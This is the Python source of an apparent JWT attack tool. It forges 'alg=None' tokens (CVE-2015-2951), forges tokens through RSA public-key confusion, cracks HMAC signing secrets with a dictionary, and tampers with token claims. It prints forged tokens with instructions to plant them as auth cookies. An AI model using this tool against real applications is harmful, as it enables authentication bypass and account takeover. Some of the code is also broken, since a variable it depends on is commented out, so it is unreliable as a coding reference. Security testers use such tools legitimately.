#! /usr/bin/python3

#
# JWT_Tool version 1.1 (08_06_2018)
# Written by ticarpi
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi
#

import sys
import hashlib
import hmac
import base64
import json
from collections import OrderedDict

def usage():
	print("Usage: $ python jwt_tool.py <JWT> (filename for dictionary or key file)\n")
	print("If you don't have a token, try this one:")
	print("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po")
	exit(1)

def checkSig(sig, contents):
	quiet = False
	print("Type in the key to test")
	key = input("> ")
	print(key)
	testKey(key, sig, contents, headDict, quiet)

def checkSigKid(sig, contents,key_file):
	quiet = False
	print("File loaded: "+keyList)
	testKey(key_file, sig, contents, headDict, quiet)

def crackSig(sig, contents,num_lines,key_list):
	quiet = True
	print("File loaded: {0}".format(key_list))
	print("Testing {0} passwords".format(num_lines))
	for i in key_list:
		testKey(i, sig, contents, headDict, quiet)

def testKey(key, sig, contents, headDict, quiet):
	#Must convert in bytes for the digest function
	key_b = key.encode('utf-8')
	contents_b = contents.encode('utf-8')
	if headDict["alg"] == "HS256":
		testHash = hmac.new(key_b,contents_b,hashlib.sha256).digest()
	elif headDict["alg"] == "HS384":
		testHash = hmac.new(key_b,contents_b,hashlib.sha384).digest()
	elif headDict["alg"] == "HS512":
		testHash = hmac.new(key_b,contents_b,hashlib.sha512).digest()
	else:
		print("Algorithm is not HMAC-SHA - cannot test with this tool.")
		exit(1)
	testSig = (base64.urlsafe_b64encode(testHash).decode('utf-8')).strip("=")
	if testSig == sig:
		if len(key) > 25:
			print("[+] "+key[0:25]+"...(output trimmed) is the CORRECT key!")
		else:
			print("[+] "+key+" is the CORRECT key!")
		exit(1)
	else:
		if quiet == False:
			if len(key) > 25:
				print("[-] "+key[0:25]+"...(output trimmed) is not the correct key")
				#print("[-] "+key+"...(output trimmed) is not the correct key")
			else:
				print("[-] "+key+" is not the correct key")
		return

def buildHead(alg, headDict):
	newHead = headDict
	newHead["alg"] = alg
	jsonDump = json.dumps(newHead,separators=(",",":"))
	newHead = base64.urlsafe_b64encode(jsonDump.encode('utf-8'))
	newHead = (newHead.decode('utf-8')).strip("=")
	return newHead

def signToken(headDict, paylDict, key, keyLength):
	newHead = headDict
	newHead["alg"] = "HS"+str(keyLength)
	#Prepare content and head for signing
	jsonContent = json.dumps(paylDict,separators=(",",":"))
	jsonHead = json.dumps(newHead,separators=(",",":"))
	bs64Content = (base64.urlsafe_b64encode(jsonContent.encode('utf-8'))).decode('utf-8').strip("=")
	bs64Head = (base64.urlsafe_b64encode(jsonHead.encode('utf-8'))).decode('utf-8').strip("=")
	newContents = bs64Head+"."+bs64Content
	#Must convert in bytes for the digest function
	newContents_b = newContents.encode('utf-8')
	key_b = key.encode('utf-8')
	if keyLength == 384:
		newSig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha384).digest())
		badSig = base64.b64encode(hmac.new(key_b,newContents_b,hashlib.sha384).digest())
	elif keyLength == 512:
		newSig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha512).digest())
		badSig = base64.b64encode(hmac.new(key_b,newContents_b,hashlib.sha512).digest())
	else:
		newSig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha256).digest())
		badSig = base64.b64encode(hmac.new(key_b,newContents_b,hashlib.sha256).digest())
	return newSig.decode('utf-8').strip("="), badSig.decode('utf-8').strip("="), newContents

def checkCVE(headDict, tok2):
	print("\nGenerating alg-stripped token...")
	alg = "None"
	newHead = buildHead(alg, headDict)
	CVEToken = newHead+"."+tok2+"."
	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
	print("\n"+CVEToken+"\n")

def checkPubKey(headDict, tok2):
	print("\nPlease enter the Public Key filename:")
	pubKey = input("> ")
	key = open(pubKey).read()
	newHead = buildHead("HS256",headDict)
	newTok = newHead+"."+tok2
	newHmac = hmac.new(key.encode('utf-8'),newTok.encode('utf-8'),hashlib.sha256).digest()
	newSig = base64.urlsafe_b64encode(newHmac)
	newSig = (newSig.decode("utf-8")).strip("=")
	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
	print("\n"+newTok+"."+newSig)

def tamperToken(paylDict, headDict):
	print("\nToken header values:")
	while True:
		i = 0
		headList = [0]
		for pair in headDict:
			menuNum = i+1
			print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
			headList.append(pair)
			i += 1
		print("["+str(i+1)+"] *ADD A VALUE*")
		print("[0] Continue to next step")
		selection = 0
		print("\nPlease select a field number:\n(or 0 to Continue)")
		selection = int(input("> "))
		if selection<len(headList) and selection>0:
			print("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]))
			print("Please enter new value and hit ENTER")
			newVal = input("> ")
			headDict[headList[selection]] = newVal
		elif selection == i+1:
			print("Please enter new Key and hit ENTER")
			newPair = input("> ")
			print("Please enter new value for "+newPair+" and hit ENTER")
			newVal = input("> ")
			headList.append(newPair)
			headDict[headList[selection]] = newVal
		elif selection == 0:
			break
		else:
			exit(1)
	print("\nToken payload values:")
	while True:
		i = 0
		paylList = [0]
		for pair in paylDict:
			menuNum = i+1
			print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
			paylList.append(pair)
			i += 1
		print("[0] Continue to next step")
		selection = 0
		print("\nPlease select a field number:\n(or 0 to Continue)")
		selection = int(input("> "))
		if selection<len(paylList) and selection>0:
			print("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]))
			print("Please enter new value and hit ENTER")
			newVal = input("> ")
			paylDict[paylList[selection]] = newVal
		elif selection == 0:
			break
		else:
			exit(1)
	print("\nToken Signing:")
	print("[1] Sign token with known key")
	print("[2] Strip signature from token vulnerable to CVE-2015-2951")
	print("[3] Sign with Public Key bypass vulnerability")
	print("[4] Sign token with key file")
	print("\nPlease select an option from above (1-4):")
	selection = int(input("> "))
	if selection == 1:
		print("\nPlease enter the known key:")
		key = input("> ")
		print("\nPlease enter the keylength:")
		print("[1] HMAC-SHA256")
		print("[2] HMAC-SHA384")
		print("[3] HMAC-SHA512")
		selLength = int(input("> "))
		if selLength == 2:
			keyLength = 384	
		elif selLength == 3:
			keyLength = 512
		else:
			keyLength = 256
		newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
		print("\nYour new forged token:")
		print("[+] URL safe: "+newContents+"."+newSig)
		print("[+] Standard: "+newContents+"."+badSig+"\n")
		exit(1)
	elif selection == 2:
		print("\nStripped Signature")
		jsonDump = json.dumps(paylDict,separators=(",",":"))
		tok2 = (base64.urlsafe_b64encode(jsonDump.encode('utf-8'))).decode('utf-8').strip("=")
		checkCVE(headDict, tok2)
		exit(1)
	elif selection == 3:
		jsonDump = json.dumps(paylDict,separators=(",",":"))
		tok2 = (base64.urlsafe_b64encode(jsonDump.encode('utf-8'))).decode('utf-8').strip("=")
		checkPubKey(headDict, tok2)
		exit(1)
	if selection == 4:
		if keyList == "":
			print("No dictionary file provided.")
			usage()
		else:
			print("\nLoading key file...")
			key1 = open(keyList).read()
			print("File loaded: "+keyList)
			print("\nPlease enter the keylength:")
			print("[1] HMAC-SHA256")
			print("[2] HMAC-SHA384")
			print("[3] HMAC-SHA512")
			selLength = int(input("> "))
			if selLength == 2:
				keyLength = 384	
			elif selLength == 3:
				keyLength = 512
			else:
				keyLength = 256
			newSig, badSig, newContents = signToken(headDict, paylDict, key1, keyLength)
			print("\nYour new forged token:")
			print("[+] URL safe: "+newContents+"."+newSig)
			print("[+] Standard: "+newContents+"."+badSig+"\n")
			exit(1)
	else:
		exit(1)


if __name__ == '__main__':
# Print logo
	print("\n,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.")
	print("----''----''----''----''----''----''----''----''----''----'")
	print("     ,--.,--.   ,--.,--------.,--------.             ,--.")
	print("     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |")
	print(",--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |")
	print("|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |")
	print(" `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'")
	print(",----.,----.,----.,----.,----.,----.,----.,----.,----.,----.")
	print("'----''----''----''----''----''----''----''----''----''----'")

# Only use Python3
	if sys.version_info[0] < 3:
		print("[-] Must be using Python 3")
		exit(1)

# Print usage + check token validity
	if len(sys.argv) < 2:
		usage()

# Temporary variables
	jwt = sys.argv[1]
	key = ""
	""" if len(sys.argv) == 3:
		keyList = sys.argv[2]
		numLines = sum(1 for line in open(keyList) if line.rstrip())
		with open(keyList, "r") as f:
		    keyLst = f.readlines()
		keyLst = [x.strip() for x in keyLst]
	else:
		keyList = "" """

# Rejig token
	try:
		tok1, tok2, sig = jwt.split(".",3)
		sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4)))
		sig = (sig.decode('utf-8')).strip('=')
		contents = tok1+"."+tok2
		head = base64.b64decode(tok1 + "=" * (-len(tok1) % 4))
		payl = base64.b64decode(tok2 + "=" * (-len(tok2) % 4))
		headDict = json.loads(head, object_pairs_hook=OrderedDict)
		paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
	except:
		print("Oh noes! Invalid token")
		exit(1)

# Main menu
	print("\nToken header values:")
	for i in headDict:
  		print("[+] "+i+" = "+str(headDict[i]))
	print("\nToken payload values:")
	for i in paylDict:
  		print("[+] "+i+" = "+str(paylDict[i]))
	print("\n######################################################")
	print("# Options:                                           #")
	print("# 1: Check CVE-2015-2951 - alg=None vulnerability    #")
	print("# 2: Check for Public Key bypass in RSA mode         #")
	print("# 3: Check signature against a key                   #")
	print("# 4: Check signature against a key file (\"kid\")      #")
	print("# 5: Crack signature with supplied dictionary file   #")
	print("# 6: Tamper with payload data (key required to sign) #")
	print("# 0: Quit                                            #")
	print("######################################################")
	print("\nPlease make a selection (1-6)")
	selection = int(input("> "))
	if selection == 1:
		checkCVE(headDict, tok2)
	elif selection == 2:
		checkPubKey(headDict, tok2)
	elif selection == 3:
		checkSig(sig, contents)
	elif selection == 4:
		print("\nPlease enter the key filename:")
		file_name= input(">")
		try:
			with open(file_name) as f:
				checkSigKid(sig, contents,f.read())
		except FileNotFoundError as e:
			print("[-] File {0} doesn't exists".format(file_name))
	elif selection == 5:
		print("\nPlease enter the dictionary filename:")
		file_name= input(">")
		try:
			with open(file_name) as f:
				num_lines = sum(1 for line in open(file_name) if line.rstrip())
				with open(file_name, "r") as f:
					lines = f.readlines()
					key_list = [x.strip() for x in lines]
					crackSig(sig, contents,num_lines,key_list)
		except FileNotFoundError as e:
			print("[-] File {0} doesn't exists".format(file_name))
	elif selection == 6:
		tamperToken(paylDict, headDict)
	else:
		exit(1)
	exit(1)

	
